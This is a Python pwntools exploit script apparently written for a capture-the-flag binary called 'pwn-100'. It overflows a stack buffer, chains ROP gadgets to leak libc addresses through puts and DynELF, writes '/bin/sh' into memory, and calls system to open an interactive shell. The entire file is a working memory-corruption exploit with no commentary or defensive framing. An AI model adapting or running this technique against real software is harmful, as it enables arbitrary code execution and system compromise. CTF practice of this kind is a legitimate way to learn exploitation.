#!/usr/bin/python3
#coding:utf-8
from pwn import *

p = process('./pwn-100')
elf = ELF("./pwn-100")

put_addr = elf.plt[b'puts']
read_addr = elf.got[b'read']

print("*********************")
print(b"[+] put_addr: " + hex(put_addr).encode())
print(b"[+] read_addr: " + hex(read_addr).encode())
print("*********************")

start_addr = 0x400550
pop_rdi_addr = 0x400763
bin_sh_addr = 0x601088    # An address where we can write "/bin/sh", can be beyond the max address in IDA
pop6_addr = 0x40075a
mov_call_r12_addr = 0x400740

def leak(addr):
    count = 0
    up = b''
    content = b''
    payload = b'A' * 72
    payload += p64(pop_rdi_addr)
    payload += p64(addr)
    payload += p64(put_addr)
    payload += p64(start_addr)
    payload = payload.ljust(200, b'B')
    p.send(payload)
    p.recvuntil(b"bye~\n")
    while True:
        c = p.recv(numb=1, timeout=0.1)
        count += 1
        if up == b'\n' and c == b'':
            content = content[:-1] + b'\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    log.info(b"%#x => %s" % (addr, (content or b'').hex().encode()))

    return content

d = DynELF(leak, elf=elf)
system_addr = d.lookup(b'system', b'libc')
log.info(b"system_addr = %#x", system_addr)

payload = b"A" * 72
payload += p64(pop6_addr)
payload += p64(0)
payload += p64(1)
payload += p64(read_addr)
payload += p64(8)
payload += p64(bin_sh_addr)
payload += p64(0)
payload += p64(mov_call_r12_addr)
payload += b'\x00' * 56
payload += p64(start_addr)

payload = payload.ljust(200, b"B")
p.send(payload)
p.recvuntil(b"bye~\n")
p.send(b"/bin/sh\x00")

payload = b"A" * 72
payload += p64(pop_rdi_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
payload = payload.ljust(200, b"A")

p.send(payload)
p.interactive()
